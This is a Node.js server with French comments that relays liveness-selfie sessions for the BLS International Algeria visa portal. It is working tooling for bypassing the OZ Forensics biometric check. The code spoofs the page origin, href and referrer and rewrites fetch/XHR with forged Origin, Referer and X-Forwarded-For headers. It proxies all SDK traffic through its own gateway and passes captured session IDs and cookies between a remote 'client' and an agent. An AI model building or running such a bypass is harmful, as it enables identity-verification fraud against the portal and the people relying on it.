/**
 * 2AO Selfie Server v1.4.1
 * Deploy on Render: https://dz34sni-26.onrender.com
 * 
 * v1.4.0 CRITICAL (flux moderne OZ — session_token/transactionId):
 *  - transaction_id est passé en OPTION DE PREMIER NIVEAU de OzLiveness.open()
 *    (et plus seulement dans meta) : sans lui, le SDK analyse sous un AUTRE
 *    transactionId → BLS /oz-forensics/verify() → FAILED.
 *  - on_error() du SDK renvoie l'erreur au serveur via POST /result/:code
 *    (status:'error') → diagnostic du selfie client SANS extension sur mobile.
 *  - Gateway de traçage OZ : /oz/* + /oz?u=<abs> + rewriting SDK → TOUS les
 *    appels OZ du téléphone passent par notre serveur (logs URL/en-têtes/
 *    corps/statut) → plus aucun angle mort côté client.
 *  - GET /oztrace : dernière activité OZ tracée (même sans logs Render).
 * 
 * v1.3.3 FIXES:
 *  - Spoof Location étendu : location.href (+ location.pathname) renvoient
 *    maintenant https://algeria.blsinternational.com/dza/appointment/LivenessRequest.
 *    Le SDK OZ analyse aussi href (pas seulement origin/hostname) pour la licence →
 *    « Verification Failed » possible sans ce spoof.
 * 
 * v1.3.2 FIXES:
 *  - isOzApi(): ne plus exclure web-sdk.prod.cdn.spain.ozforensics.com —
 *    les appels API OZ (config.php, tm.php, event.php) partent de CE host
 *    (capture réseau) → le patch fetch/XHR doit y injecter X-Forwarded-For,
 *    X-Real-IP, Origin et Referer, exactement comme le fait l'extension agent.
 *  - Retry auto si OzLiveness indéfini au lancement : re-check toutes les
 *    1,5 s et recharge la balise SDK en cas d'erreur onerror (CDN pas encore
 *    joignable via le proxy au premier essai).
 * 
 * v1.3.1 CRITICAL FIX:
 *  - Replay the REAL OzLiveness.open() config captured from the BLS portal
 *    (task.ozConfig) instead of a hardcoded guess. BLS expects the exact
 *    config (action, result_mode, meta, etc.) it passed to the SDK → mismatch
 *    of guessed config = "Verification Failed".
 *  - session_token passthrough kept (if the portal ever provides one).
 * 
 * v1.3 FIXES:
 *  - Forward session_token (JWT) from agent's ozConfig to OzLiveness.open()
 * 
 * v1.2 FIXES:
 *  - Location.prototype spoof (fakes document.location.origin to BLS)
 *  - Origin/Referer headers on OZ API calls (not just X-Forwarded-For)
 *  - Consistent header injection across all OZ requests
 * 
 * Flow (uses 4-digit CODE instead of phone):
 * 1. Agent captures userId + transactionId from BLS liveness page
 * 2. Agent POSTs task to /task/:code
 * 3. Client polls GET /task/:code → receives task
 * 4. Client navigates to GET /oz-page?... → loads OZ SDK → does selfie
 * 5. Client POSTs result to /result/:code (success OU error via on_error)
 * 6. Agent polls GET /result/:code → gets event_session_id → injects
 * 7. Agent DELETEs /clear/:code → cleanup
 */

const express = require('express');
const cors = require('cors');
const zlib = require('zlib');
const app = express();
const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════
// OZ GATEWAY CONFIG (v1.4.0)
// ═══════════════════════════════════════════
const OZ_BASE = 'https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational3';
const OZ_HOST = 'web-sdk.prod.cdn.spain.ozforensics.com';
const BLS_ORIGIN_S = 'https://algeria.blsinternational.com';
const BLS_PATH_S = '/dza/appointment/LivenessRequest';

// Trace circulaire : dernière activité OZ + logs récents (consultable /oztrace)
const TRACE = { oz: [], log: [] };
function traceOz(entry) {
    TRACE.oz.push(Object.assign({ at: new Date().toISOString() }, entry));
    if (TRACE.oz.length > 400) TRACE.oz.splice(0, TRACE.oz.length - 400);
    try { console.log('[OZ-GW] ' + JSON.stringify(entry).substring(0, 600)); } catch (e) {}
}
function traceLog(msg) {
    TRACE.log.push({ at: new Date().toISOString(), msg: String(msg).substring(0, 500) });
    if (TRACE.log.length > 200) TRACE.log.splice(0, TRACE.log.length - 200);
}

// ═══════════════════════════════════════════
// MIDDLEWARE
// ═══════════════════════════════════════════
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

app.use((req, res, next) => {
    const ts = new Date().toISOString().substring(11, 19);
    if (req.path.indexOf('/oz') !== 0) console.log(`[${ts}] ${req.method} ${req.path}`);
    next();
});

// ═══════════════════════════════════════════
// IN-MEMORY STORAGE
// ═══════════════════════════════════════════
const tasks = {};
const results = {};

// Auto-cleanup: remove entries older than 30 minutes
setInterval(() => {
    const now = Date.now();
    const MAX_AGE = 30 * 60 * 1000;
    for (const code in tasks) {
        if (now - (tasks[code].timestamp || 0) > MAX_AGE) {
            delete tasks[code];
            console.log(`[CLEANUP] Task removed: ${code}`);
        }
    }
    for (const code in results) {
        if (now - (results[code].timestamp || 0) > MAX_AGE) {
            delete results[code];
            console.log(`[CLEANUP] Result removed: ${code}`);
        }
    }
}, 5 * 60 * 1000);

// ═══════════════════════════════════════════
// ROUTES: TASK (Agent → Client)
// ═══════════════════════════════════════════

app.post('/task/:code', (req, res) => {
    const code = req.params.code;
    const body = req.body || {};
    
    if (!body.userId || !body.transactionId) {
        return res.status(400).json({ ok: false, error: 'Missing userId or transactionId' });
    }

    tasks[code] = {
        userId: body.userId,
        transactionId: body.transactionId,
        realIp: body.realIp || '',
        proxy: body.proxy || '',
        cookies: body.cookies || '',
        userAgent: body.userAgent || '',
        pageUrl: body.pageUrl || '',
        verificationToken: body.verificationToken || '',
        ozConfig: body.ozConfig || '',
        timestamp: body.timestamp || Date.now()
    };

    console.log(`[TASK] 📥 ${code}: userId=${body.userId.substring(0, 20)}... realIp=${body.realIp || 'none'} proxy=${body.proxy ? '✅' : '—'}`);
    res.json({ ok: true });
});

app.get('/task/:code', (req, res) => {
    const code = req.params.code;
    const task = tasks[code];

    if (task) {
        console.log(`[TASK] 📤 ${code}: sending task`);
        res.json({ ok: true, task: task });
    } else {
        res.json({ ok: false, task: null });
    }
});

// ═══════════════════════════════════════════
// ROUTES: RESULT (Client → Agent)
// ═══════════════════════════════════════════

app.post('/result/:code', (req, res) => {
    const code = req.params.code;
    const body = req.body || {};

    // v1.4.0 : le client peut aussi renvoyer une ERREUR SDK (on_error)
    if (body.status === 'error') {
        results[code] = {
            status: 'error',
            error: String(body.error || 'unknown').substring(0, 500),
            transactionId: body.transactionId || '',
            realIp: body.realIp || '',
            timestamp: body.timestamp || Date.now()
        };
        delete tasks[code];
        traceLog(`[RESULT:ERROR] ${code}: ${JSON.stringify(body).substring(0, 300)}`);
        console.log(`[RESULT] ❌ ${code}: SELFIE ERREUR -> ${String(body.error).substring(0, 300)}`);
        return res.json({ ok: true, status: 'error' });
    }

    if (!body.event_session_id) {
        return res.status(400).json({ ok: false, error: 'Missing event_session_id' });
    }

    results[code] = {
        event_session_id: body.event_session_id,
        status: body.status || 'completed',
        realIp: body.realIp || '',
        timestamp: body.timestamp || Date.now()
    };

    delete tasks[code];

    console.log(`[RESULT] ✅ ${code}: session=${body.event_session_id.substring(0, 20)}...`);
    res.json({ ok: true });
});

app.get('/result/:code', (req, res) => {
    const code = req.params.code;
    const result = results[code];

    if (result) {
        console.log(`[RESULT] 📤 ${code}: sending result`);
        res.json({ ok: true, result: result });
    } else {
        res.json({ ok: false, result: null });
    }
});

// ═══════════════════════════════════════════
// ROUTES: CLEANUP
// ═══════════════════════════════════════════

app.delete('/clear/:code', (req, res) => {
    const code = req.params.code;
    delete tasks[code];
    delete results[code];
    console.log(`[CLEAR] 🗑️ ${code}`);
    res.json({ ok: true });
});

// ═══════════════════════════════════════════
// OZ GATEWAY DE TRACAGE (v1.4.0)
// Fait transiter TOUS les appels OZ du téléphone par notre serveur :
//   - /oz/<chemin>   → relais vers https://web-sdk.../blsinternational3/<chemin>
//   - /oz?u=<abs>    → relais absolu (upload/capsule depuis le phone patché)
// Journalise méthode, URL, en-têtes clés, corps, statut et durée.
// ═══════════════════════════════════════════

function forwardOz(req, res, target, codeHint) {
    const started = Date.now();
    const myHeaders = { ...req.headers };
    delete myHeaders['host'];
    delete myHeaders['connection'];
    delete myHeaders['keep-alive'];
    delete myHeaders['transfer-encoding'];
    delete myHeaders['proxy-connection'];
    delete myHeaders['upgrade'];

    // Injection en-têtes côté serveur. Pour les cibles OZ : Host/Origin/Referer
    // BLS (le SDK calcule l'origine/le domaine de licence depuis ces en-têtes).
    // Pour les cibles BLS éventuelles : on laisse le Host naturel, pas d'Origin/
    // Referer forcés (appels "same-origin" du SDK vers le portail).
    const targetIsBLS = target.indexOf('blsinternational.com') !== -1;
    if (!targetIsBLS) {
        myHeaders['host'] = OZ_HOST;
        myHeaders['origin'] = BLS_ORIGIN_S;
        myHeaders['referer'] = BLS_ORIGIN_S + BLS_PATH_S;
    } else {
        delete myHeaders['origin'];
        delete myHeaders['referer'];
    }
    const realIp = (req.headers['x-2ao-ip']) || (req.cookies && req.cookies['dz2ao_ip']) || req.headers['x-forwarded-for'] || '';
    if (realIp) { myHeaders['x-forwarded-for'] = realIp; myHeaders['x-real-ip'] = realIp; }

    // v1.4.1 FIX CRITIQUE : OZ gzip le SDK (Content-Encoding: gzip) quand le
    // navigateur envoie Accept-Encoding: gzip → notre gateway renvoyait les
    // OCTETS GZIP BRUTS sans l'en-tête Content-Encoding → le <script> était
    // un blob gzip impossible à parser → SDK jamais lancé (ni téléphone, ni test).
    // → 1) on demande identity en amont 2) on décompresse quand même le gzip
    // si le CDN répond compressé 3) jamais de content-length (taille faussée).
    myHeaders['accept-encoding'] = 'identity';

    const isBinary = /(octet-stream|multipart|wasm|zip|data|font|image)/i.test((req.headers['content-type'] || ''));
    let reqBodyChunk = '';
    const origEnd = res.end.bind(res);
    let respSize = 0;
    let respHead = '';
    res.end = function(chunk, enc, cb) {
        if (chunk && chunk.length) respSize += chunk.length;
        return origEnd(chunk, enc, cb);
    };

    const doLog = (ok, extra) => {
        const dur = Date.now() - started;
        traceOz({
            code: codeHint || (req.query._c || '') || '-',
            method: req.method,
            target: target.substring(0, 220),
            status: ok === false ? 'ERR' : (res.statusCode || ''),
            size: respSize,
            dur: dur + 'ms',
            clientIp: (req.headers['x-forwarded-for'] || req.ip || '').substring(0, 40),
            extra: extra || ''
        });
    };

    try {
        const http = require('http');
        const https = require('https');
        const u = new URL(target);
        const lib = u.protocol === 'https:' ? https : http;
        const preq = lib.request(u, {
            method: req.method,
            headers: myHeaders,
            timeout: 30000
        }, (pres) => {
            res.statusCode = pres.statusCode;
            const hdrs = {};
            for (const [k, v] of Object.entries(pres.headers)) {
                if (/^(connection|keep-alive|transfer-encoding|upgrade|content-encoding|content-length)$/i.test(k)) continue;
                try { hdrs[k] = v; } catch (e) {}
            }
            res.set(hdrs);
            // v1.4.1 : décompression amont (gzip/deflate/br) → on sert toujours identity.
            let pipe = pres;
            const enc = String(pres.headers['content-encoding'] || '').toLowerCase();
            if (enc === 'gzip' || enc === 'x-gzip') pipe = pres.pipe(zlib.createGunzip());
            else if (enc === 'deflate') pipe = pres.pipe(zlib.createInflate());
            else if (enc === 'br') pipe = pres.pipe(zlib.createBrotliDecompress());
            pipe.on('data', (d) => {
                respSize += d.length;
                if (respHead.length < 400) respHead += d.toString('latin1');
            });
            pipe.on('end', () => {
                doLog(true, respHead.substring(0, 200));
                res.end();
            });
            pipe.pipe(res, { end: false });
            pipe.on('error', (e) => { doLog(false, 'resp: ' + e.message); res.end(); });
        });
        preq.on('timeout', function() { preq.destroy(new Error('timeout')); });
        preq.on('error', (e) => { doLog(false, 'req: ' + e.message); try { res.status(502).end('gw error'); } catch (e2) {} });

        if (req.headers['content-length']) {
            let sent = 0;
            req.on('data', (d) => {
                sent += d.length;
                if (!isBinary && reqBodyChunk.length < 800) reqBodyChunk += d.toString('utf8');
            });
            req.on('end', () => {
                if (reqBodyChunk) reqBodyChunk = 'BODY:' + reqBodyChunk;
                if (!isBinary && reqBodyChunk) {
                    const m = myHeaders;
                    m['x-2ao-body-hash'] = 'len:' + sent;
                    traceOz({
                        code: codeHint || req.query._c || '-',
                        method: req.method,
                        target: target.substring(0, 160),
                        body: reqBodyChunk.substring(0, 300)
                    });
                }
            });
        }
        req.pipe(preq);
    } catch (e) {
        doLog(false, e.message);
        try { res.status(502).json({ ok: false, error: 'gw:' + e.message }); } catch (e2) {}
    }
}

app.use('/oz', (req, res, next) => {
    // Garde-fou : ne pas avaler /oz-page, /oztrace ni d'autres routes en /oz*
    const tail = req.originalUrl.slice(3);
    if (tail !== '' && tail.charAt(0) !== '/' && tail.charAt(0) !== '?') return next();
    traceLog(`[OZ-GW] ${req.method} ${req.originalUrl}`);
    const codeHint = req.query._c || '';
    // 1) mode absolu : /oz?u=<url> (fetch/XHR du téléphone re-écrits)
    if (req.query.u) {
        const u = String(req.query.u);
        if (/^https:\/\//i.test(u) && (u.indexOf('ozforensics.com') !== -1 || u.indexOf('blsinternational.com') !== -1)) {
            return forwardOz(req, res, u, codeHint);
        }
        return res.status(400).json({ ok: false, error: 'bad target' });
    }
    // 2) relais relatif CDN : /oz/plugin_liveness.php?ver=...
    return forwardOz(req, res, OZ_BASE + (req.url === '/' ? '' : req.url), codeHint);
});

app.get('/oztrace', (req, res) => {
    res.json({
        version: '1.4.1',
        oz: TRACE.oz.slice(-150),
        log: TRACE.log.slice(-60),
        tasks: Object.keys(tasks).length,
        results: Object.keys(results).length
    });
});

// ═══════════════════════════════════════════
// ROUTE: OZ-PAGE (Client loads this for real selfie)
// ═══════════════════════════════════════════

app.get('/oz-page', (req, res) => {
    const { userId, transactionId, realIp, code, phone, proxy } = req.query;
    const clientCode = code || phone || '';
    
    // ═══ v1.3.1: Replay the REAL ozConfig captured from the BLS portal ═══
    // The agent's 2ao-page.js captures the exact config passed to
    // OzLiveness.open() on the portal and sends it to /task/:code.
    // We replay its serializable fields (action, result_mode, meta, ...)
    // so the client page opens an IDENTICAL session, not a guessed one.
    let realCfg = {};
    let sessionToken = '';
    const task = tasks[clientCode];
    if (task && task.ozConfig) {
        try {
            const parsed = typeof task.ozConfig === 'string' ? JSON.parse(task.ozConfig) : task.ozConfig;
            if (parsed && typeof parsed === 'object') {
                for (const k of Object.keys(parsed)) {
                    if (/^on_/i.test(k)) continue;
                    if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;
                    realCfg[k] = parsed[k];
                }
            }
            sessionToken = parsed.session_token || '';
            const metaKeys = realCfg.meta ? Object.keys(realCfg.meta) : [];
            console.log(`[OZ-PAGE] ${clientCode}: real config replayed (keys: ${Object.keys(realCfg).join(',') || 'none'}) meta=${metaKeys.join(',') || '—'} session_token=${sessionToken ? '✅' : '—'}`);
        } catch (e) {
            console.log(`[OZ-PAGE] ${clientCode}: ozConfig parse error:`, e.message);
        }
    }
    realCfg.meta = Object.assign({}, realCfg.meta && typeof realCfg.meta === 'object' ? realCfg.meta : {});
    
    const escJs = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/</g, '\\x3c').replace(/>/g, '\\x3e');
    const uid = escJs(userId);
    const tid = escJs(transactionId);
    const ip = escJs(realIp);
    const cd = escJs(clientCode);
    const st = escJs(sessionToken);
    // v1.4.0 : base de notre serveur (pour le reverse proxy OZ côté téléphone)
    const base = (req.headers['x-forwarded-proto'] || req.protocol) + '://' + req.get('host');

    // Cookie IP réelle → le gateway /oz l'utilise comme X-Forwarded-For
    if (ip) {
        try { res.cookie('dz2ao_ip', ip, { httpOnly: false, maxAge: 6 * 3600 * 1000, sameSite: 'lax' }); } catch (e) {}
    }

    const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>BLS Liveness Check</title>
<!-- v1.4.0 : toutes les URLs relatives du SDK OZ (plugin/*, vendor/*, *.wasm,
     *.js) doivent résoudre sous {base}/oz/ pour passer par la gateway de
     traçage — sinon container.wasm serait demandé à /plugin/... (404 local). -->
<base href="${base}/oz/">
<style>
body { margin: 0; background: #08090d; font-family: system-ui, sans-serif; }
#st {
    position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
    background: linear-gradient(135deg,#FF6B35,#F7931E); color: #fff;
    padding: 12px 24px; border-radius: 10px;
    font-size: 14px; z-index: 99999; text-align: center; font-weight: 700;
    box-shadow: 0 4px 20px rgba(247,147,30,.4);
}
.ozliveness_logo,.ozliveness_version{display:none!important}

/* Success overlay */
#success-screen{position:fixed;inset:0;z-index:2147483647;display:none;align-items:center;justify-content:center;background:linear-gradient(135deg,#0d9488,#059669,#047857);overflow:hidden}
@keyframes confetti{0%{opacity:1;transform:translateY(0) rotate(0deg)}100%{opacity:0;transform:translateY(100vh) rotate(720deg)}}
@keyframes pop{0%{transform:scale(0);opacity:0}50%{transform:scale(1.15)}100%{transform:scale(1);opacity:1}}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
</style>
</head>
<body>
<div id="oz-container"></div>
<div id="st">🔥 Chargement SDK...</div>

<!-- Success screen with confetti -->
<div id="success-screen">
    <div id="confetti-container"></div>
    <div style="text-align:center;z-index:2;animation:pop .6s ease-out forwards">
        <div style="font-size:80px;margin-bottom:10px;animation:bounce 1.5s ease-in-out infinite">🎉</div>
        <div style="font-size:36px;font-weight:900;color:#fff;margin-bottom:8px;text-shadow:0 4px 20px rgba(0,0,0,.3)">FÉLICITATIONS !</div>
        <div style="font-size:20px;font-weight:700;color:rgba(255,255,255,.9);margin-bottom:6px">✅ Selfie réussi avec succès</div>
        <div style="font-size:15px;color:rgba(255,255,255,.7);margin-bottom:28px">يمكنك الان اغلاق هذه الصفحة</div>
        <button onclick="closePage()" style="padding:16px 44px;border-radius:14px;border:none;cursor:pointer;font-weight:700;font-size:17px;color:#059669;background:#fff;box-shadow:0 6px 30px rgba(0,0,0,.2);letter-spacing:1px;animation:pop .6s ease-out .3s both">🏠 RETOUR</button>
        <div style="margin-top:16px;font-size:14px;color:rgba(255,255,255,.7);font-weight:700">Retour dans <span id="countdown">8</span>s</div>
    </div>
</div>

<!-- ═══ LOCATION ORIGIN SPOOF ═══ -->
<!-- The OZ SDK checks document.location.origin against its license.
     This page lives on onrender.com → LICENSE_ORIGIN_ERROR.
     We patch Location.prototype BEFORE any SDK script runs so
     the SDK sees algeria.blsinternational.com as the origin. -->
<script>
(function(){
    var B='https://algeria.blsinternational.com';
    var H='algeria.blsinternational.com';
    var PATH='/dza/appointment/LivenessRequest';
    try{Object.defineProperty(window,'origin',{configurable:true,get:function(){return B;}});}catch(e){}
    try{Object.defineProperty(location,'origin',{configurable:true,get:function(){return B;}});}catch(e){}
    try{Object.defineProperty(document,'domain',{configurable:true,get:function(){return H;}});}catch(e){}
    try{Object.defineProperty(document,'referrer',{configurable:true,get:function(){return B+'/manage-appointments';}});}catch(e){}
    var P=window.Location&&window.Location.prototype;
    if(P){
        [['origin',function(){return B;}],
        ['hostname',function(){return H;}],
        ['host',function(){return H;}],
        ['protocol',function(){return 'https:';}],
        ['pathname',function(){return PATH;}],
        ['href',function(){return B+PATH;}]
        ].forEach(function(a){try{Object.defineProperty(P,a[0],{configurable:true,get:a[1]});}catch(e){}});
    }
    try{history.replaceState({},'', PATH);}catch(e){}
})();
</script>

<!-- ═══ OZ API HEADER INJECTION ═══ -->
<!-- Intercept fetch/XHR to add Origin, Referer, X-Forwarded-For on OZ API calls.
     Without Origin/Referer → LICENSE_ORIGIN_ERROR.
     Without X-Forwarded-For → IP mismatch detected by OZ. -->
<script>
(function(){
    var REAL_IP = '${ip}';
    var BLS_ORIGIN = 'https://algeria.blsinternational.com';
    var BLS_REFERER = 'https://algeria.blsinternational.com/manage-appointments';
    
    function isOzApi(u){
        // v1.4.0 : appels OZ directs (ozforensics.com) et URLs déjà ré-écrites
        // vers notre gateway. On compare à OZ_GW (notre vrai origin) car
        // window.location.origin est spoofé vers algeria.blsinternational.com.
        if (typeof u === 'string' && u.indexOf('ozforensics.com') !== -1) return true;
        try {
            if (typeof u === 'string' && OZ_GW && (u.indexOf(OZ_GW + '/oz') === 0 || u.indexOf(OZ_GW + '/oz?') === 0)) return true;
        } catch (e) {}
        return false;
    }

    var OZ_GW = '${base}';

    function ozRewrite(u){
        // Réécrit toute URL OZ absolue vers notre gateway (traçage + injection serveur)
        if (typeof u !== 'string' || u.indexOf('ozforensics.com') === -1) return u;
        return OZ_GW + '/oz?u=' + encodeURIComponent(u);
    }
    
    // Patch fetch
    var _f = window.fetch;
    window.fetch = function(u, o) {
        o = o || {};
        if (isOzApi(u)) {
            if (!o.headers) o.headers = {};
            if (o.headers instanceof Headers) {
                o.headers.set('X-Forwarded-For', REAL_IP);
                o.headers.set('X-Real-IP', REAL_IP);
                o.headers.set('Origin', BLS_ORIGIN);
                o.headers.set('Referer', BLS_REFERER);
            } else {
                o.headers['X-Forwarded-For'] = REAL_IP;
                o.headers['X-Real-IP'] = REAL_IP;
                o.headers['Origin'] = BLS_ORIGIN;
                o.headers['Referer'] = BLS_REFERER;
            }
            u = ozRewrite(u);
        }
        return _f.call(this, u, o);
    };
    
    // Patch XMLHttpRequest
    var _xo = XMLHttpRequest.prototype.open;
    var _xs = XMLHttpRequest.prototype.send;
    var _xh = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.open = function(m, u) { this._dzUrl = ozRewrite(u); return _xo.apply(this, arguments); };
    XMLHttpRequest.prototype.send = function() {
        if (isOzApi(this._dzUrl)) {
            try { _xh.call(this, 'X-Forwarded-For', REAL_IP); } catch(e) {}
            try { _xh.call(this, 'X-Real-IP', REAL_IP); } catch(e) {}
            try { _xh.call(this, 'Origin', BLS_ORIGIN); } catch(e) {}
            try { _xh.call(this, 'Referer', BLS_REFERER); } catch(e) {}
        }
        return _xs.apply(this, arguments);
    };
})();
</script>

<form id="formLiveness" method="post" action="/dza/appointment/LivenessResponse">
    <input type="hidden" name="event_session_id" id="event_session_id" value="">
    <input type="hidden" name="LivenessId" id="LivenessId" value="">
    <input type="hidden" name="__RequestVerificationToken" value="">
</form>

<script id="oz-sdk" src="${base}/oz/plugin_liveness.php?ver=1.9.7-29" onerror="window.__ozSdkFail=1;"></script>

<script>
function closePage() {
    try { window.close(); } catch (e) {}
    try { history.back(); } catch (e) {}
}

function showSuccess() {
    var screen = document.getElementById('success-screen');
    if (!screen) return;
    screen.style.display = 'flex';
    
    // Generate confetti
    var container = document.getElementById('confetti-container');
    var colors = ['#FFD700','#FF6B35','#F7931E','#4ade80','#60a5fa','#c084fc','#fb7185','#fff'];
    for (var i = 0; i < 60; i++) {
        var d = document.createElement('div');
        d.style.cssText = 'position:absolute;top:-10px;left:' + Math.random()*100 + '%;width:' + (4+Math.random()*8) + 'px;height:' + (4+Math.random()*8) + 'px;background:' + colors[Math.floor(Math.random()*8)] + ';border-radius:' + (Math.random()>.5?'50%':'2px') + ';animation:confetti ' + (2+Math.random()*3) + 's ease-out ' + Math.random()*2 + 's forwards;opacity:0';
        container.appendChild(d);
    }
    
    // Countdown
    var countEl = document.getElementById('countdown');
    var sec = 8;
    var t = setInterval(function() {
        sec--;
        if (countEl) countEl.textContent = String(sec);
        if (sec <= 0) {
            clearInterval(t);
            closePage();
        }
    }, 1000);
}

var SDK_SRC = '${base}/oz/plugin_liveness.php?ver=1.9.7-29';
var __ozSdkTries = 0;
var __ozSdkMaxTries = 8;
var __ozStarted = false;

function startSelfie() {
    if (__ozStarted) return;
    __ozStarted = true;
    try {
        document.getElementById('st').textContent = '📸 Démarrage selfie...';
        var _st = '${st}';
        // v1.3.1: exact config rejoué du portail BLS (action, result_mode, meta...)
        var _ozCfg = ${JSON.stringify(realCfg).replace(/</g, '\\u003c')};
        _ozCfg.meta = _ozCfg.meta || {};
        if ('${uid}') _ozCfg.meta.user_id = '${uid}';
        // v1.4.0 : transaction_id doit être une OPTION DE PREMIER NIVEAU.
        // Flux moderne : POST /oz-forensics/session-token renvoie ce champ et
        // le SDK v1.9.7-29 le lit à la racine de la config — pas dans meta.
        if ('${tid}') _ozCfg.transaction_id = '${tid}';
        if (_st) _ozCfg.session_token = _st;
        // filet de secours si le config rejoué est vide
        if (!_ozCfg.action) _ozCfg.action = ['video_selfie_blank'];
        if (!_ozCfg.result_mode) _ozCfg.result_mode = 'safe';
        if (!_ozCfg.lang) _ozCfg.lang = 'en';
        if (typeof _ozCfg.overlay_options === 'undefined') _ozCfg.overlay_options = false;
        _ozCfg.on_complete = function(r) {
                var sid = r && r.event_session_id ? String(r.event_session_id) : '';
                if (sid) {
                    document.getElementById('st').textContent = '✅ Selfie OK!';
                    try { document.getElementById('event_session_id').value = sid; } catch(e) {}
                    try { document.getElementById('LivenessId').value = sid; } catch(e) {}
                    if (window.Android) try { window.Android.onSelfieComplete(sid); } catch(ab) {}
                    // AUTO POST result to server (for APK Chrome Custom Tabs support)
                    var _code = '${cd}';
                    if (_code) {
                        fetch('/result/' + encodeURIComponent(_code), {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ event_session_id: sid, status: 'completed', realIp: '${ip}', timestamp: Date.now() })
                        }).catch(function(){});
                    }
                    showSuccess();
                } else {
                    document.getElementById('st').textContent = 'Pas de session ID';
                    if (window.Android) window.Android.onSelfieError('No session ID');
                }
            };
            _ozCfg.on_error = function(e) {
                var msg = e && e.message ? e.message : String(e);
                document.getElementById('st').textContent = 'Erreur: ' + msg;
                if (window.Android) window.Android.onSelfieError(msg);
                // v1.4.0 : diagnostic mobile sans extension → remontée au serveur
                var _code = '${cd}';
                if (_code) {
                    try {
                        fetch('/result/' + encodeURIComponent(_code), {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ status: 'error', error: msg, transactionId: '${tid}', realIp: '${ip}', timestamp: Date.now() })
                        }).catch(function(){});
                    } catch (xb) {}
                }
            };
            try { fetch('/oztrace?open=1', { cache: 'no-store' }).catch(function(){}); } catch(xd) {}
            // v1.4.0 : on_capture_complete (rare mais présent sur certains flux)
            _ozCfg.on_capture_complete = function(r) {
                try { fetch('/oztrace?cap=1', { cache: 'no-store' }).catch(function(){}); } catch (xc) {}
            };
            OzLiveness.open(_ozCfg);
    } catch(x) {
        document.getElementById('st').textContent = 'Erreur: ' + x.message;
        if (window.Android) window.Android.onSelfieError(x.message);
    }
}

function bootOZ() {
    if (typeof OzLiveness !== 'undefined') { startSelfie(); return; }
    if (__ozSdkTries >= __ozSdkMaxTries) {
        document.getElementById('st').textContent = 'SDK non chargé (CDN injoignable)';
        if (window.Android) window.Android.onSelfieError('SDK not loaded');
        return;
    }
    __ozSdkTries++;
    document.getElementById('st').textContent = 'SDK… tentative ' + __ozSdkTries + '/' + __ozSdkMaxTries;
    // v1.3.2 : si la balise SDK a échoué (onerror), on la recharge proprement
    if (window.__ozSdkFail) {
        window.__ozSdkFail = 0;
        var s = document.getElementById('oz-sdk');
        if (s) {
            var ns = document.createElement('script');
            ns.id = 'oz-sdk';
            ns.src = SDK_SRC;
            ns.onerror = function() { window.__ozSdkFail = 1; };
            ns.onload = function() { window.__ozSdkFail = 0; };
            s.parentNode.replaceChild(ns, s);
        }
        return;
    }
    setTimeout(bootOZ, 1500);
}

window.addEventListener('load', function() {
    document.getElementById('st').textContent = '🔥 Lancement...';
    setTimeout(bootOZ, 3000);
});
</script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
});

// ═══════════════════════════════════════════
// HEALTH & STATUS
// ═══════════════════════════════════════════

app.get('/', (req, res) => {
    res.json({
        service: '2AO Selfie',
        version: '1.4.1',
        status: 'running',
        activeTasks: Object.keys(tasks).length,
        activeResults: Object.keys(results).length,
        uptime: Math.floor(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ ok: true, timestamp: Date.now() });
});

app.get('/debug', (req, res) => {
    res.json({
        tasks: Object.keys(tasks).map(c => ({ code: c, userId: (tasks[c].userId || '').substring(0, 10) + '...', age: Math.floor((Date.now() - tasks[c].timestamp) / 1000) + 's' })),
        results: Object.keys(results).map(c => ({ code: c, sessionId: (results[c].event_session_id || '').substring(0, 10) + '...', age: Math.floor((Date.now() - results[c].timestamp) / 1000) + 's' }))
    });
});

// ═══════════════════════════════════════════
// START
// ═══════════════════════════════════════════
app.listen(PORT, () => {
    console.log(`\n🔥 2AO Selfie Server v1.4.1`);
    console.log(`   Port: ${PORT}`);
    console.log(`   Ready!\n`);
});
